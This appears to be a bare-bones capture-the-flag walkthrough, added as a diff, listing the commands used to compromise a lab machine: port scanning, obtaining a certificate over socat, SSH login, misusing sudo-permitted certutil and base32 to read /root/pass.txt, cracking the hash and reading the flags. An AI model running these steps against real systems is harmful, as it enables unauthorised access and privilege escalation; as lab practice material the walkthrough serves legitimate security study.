@@ -1,0 +1,17 @@
+1 - nmap -A -p- 10.10.184.41
+2 - socat TCP:10.10.184.41:9009 - -> help, certificate, key
+3 - socat stdio ssl:10.10.184.41:54321,cert=cert,key=key,verify=0 -> help
+4 - ssh barney@10.10.184.41
+5 - cat barney.txt
+6 - sudo -l
+7 - certutil ls
+8 - sudo certutil -a fred.csr.pem
+9 - socat stdio ssl:10.10.184.41:54321,cert=fred_cert,key=fred_key,verify=0 -> help
+10 - su fred
+11 - cat /home/fred/fred.txt
+12 - sudo -l
+13 - sudo /usr/bin/base32 /root/pass.txt | base32 -d
+14 - cyberchef
+15 - crackstation
+16 - su root
+17 - cat /root/root.txt
